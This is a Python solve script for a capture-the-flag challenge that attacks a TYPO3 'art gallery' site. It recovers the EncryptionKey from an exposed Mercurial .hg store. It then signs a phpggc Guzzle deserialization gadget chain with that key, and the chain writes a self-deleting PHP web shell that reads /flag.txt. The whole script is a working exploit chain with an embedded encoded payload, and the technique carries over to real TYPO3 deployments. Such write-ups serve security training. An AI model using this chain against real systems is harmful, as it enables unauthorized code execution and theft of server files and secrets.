from hashlib import sha1
import hmac
import json
import requests
import zstd

URL = "http://artgallery.ctf.bzh"
ENCRYPTION_KEY = "6ba18cabee8701434b5400dd3b1239bcc6c1e9fd81cd3515991a374c89dd16d0f7627f525595f3a7f1c01cf139aec243"
FLAG = r"BZHCTF{MyGadgetsAreWorksOfArt}"


"""
    Step 1 : Extract LocalConfiguration.php from .hg
"""

s = requests.session()

r = s.get(f"{URL}/.hg/requires").text
assert ("share-safe" in r)
print("[+] .hg folder is available")

# uppercase is escaped: 'FOO' -> '_f_o_o'
# https://www.mercurial-scm.org/wiki/FileFormats#data.2F
r = s.get(f"{URL}/.hg/store/data/public/typo3conf/_local_configuration.php.i")
assert (r.status_code == 200)
print("[+] LocalConfiguration.php (_local_configuration.php.i) is available in .hg folder")


"""
    Step 2 : Decode _local_configuration.php.i and recover EncryptionKey
"""

# strip 64 first bytes
# https://www.mercurial-scm.org/wiki/RevlogNG#RevlogNG_format
# and decompress with zstd
# https://www.mercurial-scm.org/wiki/Release4.1
# https://www.mercurial-scm.org/wiki/Release5.8
data = r.content[64:]
local_configuration = zstd.decompress(data).decode()
assert (ENCRYPTION_KEY in local_configuration)
print("[+] EncryptionKey found in _local_configuration.php.i")


"""
    Step 3 : File write using unserialize() 
"""

# https://www.synacktiv.com/en/publications/typo3-leak-to-remote-code-execution.html#

# Generate gadget chain and encode in base64
# https://github.com/ambionics/phpggc/blob/master/gadgetchains/Guzzle/FW/1/chain.php
# phpggc Guzzle/FW1 /challenge/public/art-static/solve.php $(realpath solve.php) 2>/dev/null | base64 -w 0
gadgets_chain = "TzozMToiR3V6emxlSHR0cFxDb29raWVcRmlsZUNvb2tpZUphciI6NDp7czozNjoiAEd1enpsZUh0dHBcQ29va2llXENvb2tpZUphcgBjb29raWVzIjthOjE6e2k6MDtPOjI3OiJHdXp6bGVIdHRwXENvb2tpZVxTZXRDb29raWUiOjE6e3M6MzM6IgBHdXp6bGVIdHRwXENvb2tpZVxTZXRDb29raWUAZGF0YSI7YTozOntzOjc6IkV4cGlyZXMiO2k6MTtzOjc6IkRpc2NhcmQiO2I6MDtzOjU6IlZhbHVlIjtzOjYxOiI8P3BocCBlY2hvKGZpbGVfZ2V0X2NvbnRlbnRzKCRfR0VUWzBdKSk7IHVubGluayhfX0ZJTEVfXyk7ID8+Ijt9fX1zOjM5OiIAR3V6emxlSHR0cFxDb29raWVcQ29va2llSmFyAHN0cmljdE1vZGUiO047czo0MToiAEd1enpsZUh0dHBcQ29va2llXEZpbGVDb29raWVKYXIAZmlsZW5hbWUiO3M6Mzg6Ii9jaGFsbGVuZ2UvcHVibGljL2FydC1zdGF0aWMvc29sdmUucGhwIjtzOjUyOiIAR3V6emxlSHR0cFxDb29raWVcRmlsZUNvb2tpZUphcgBzdG9yZVNlc3Npb25Db29raWVzIjtiOjE7fQo="

def gen_sign(string, key):
    # Sign gadgetchain with EncryptionKey recovered from LocalConfiguration.php
    # https://github.com/TYPO3/typo3/blob/f43979e74409500b731a98b39f978379669ed2e9/typo3/sysext/extbase/Classes/Security/Cryptography/HashService.php#L45
    return hmac.new(key.encode(), string.encode(), sha1).hexdigest()

# Generates request data payload to be sent as 'form-data'
# route extracted from leggit form submit
# cHash: https://github.com/TYPO3/typo3/blob/11.5/typo3/sysext/frontend/Classes/Page/CacheHashCalculator.php#L49

route = f"{URL}/debug-contact-form?tx_form_formframework[action]=perform&tx_form_formframework[controller]=FormFrontend&cHash=5896fae28c9ab2b7816b837d8fdf8172"
BOUNDARY = "de5130f1327f151d8d67483c37095a08"
key = "tx_form_formframework[contactform-1][__state]"
value = gadgets_chain+gen_sign(gadgets_chain, ENCRYPTION_KEY)
payload = f'--{BOUNDARY}\r\nContent-Disposition: form-data; name="{key}"\r\n\r\n{value}\r\n--{BOUNDARY}--'
headers = {
    'Content-type': f"multipart/form-data; boundary={BOUNDARY}",
    'Cache-control': "no-cache"
}

# Submit file write exploit
r = s.post(route, headers=headers, data=payload)
assert("Oops, an error occurred!" in r.text)
print("[+] Exploit submitted successfully")


"""
    Step 4 : Get /flag.txt file
"""

r = json.loads(s.get(f"{URL}/art-static/solve.php?0=/flag.txt").text)
rflag = r[0]["Value"]
assert (rflag == FLAG)
print(f"[+] Got flag: {rflag}")
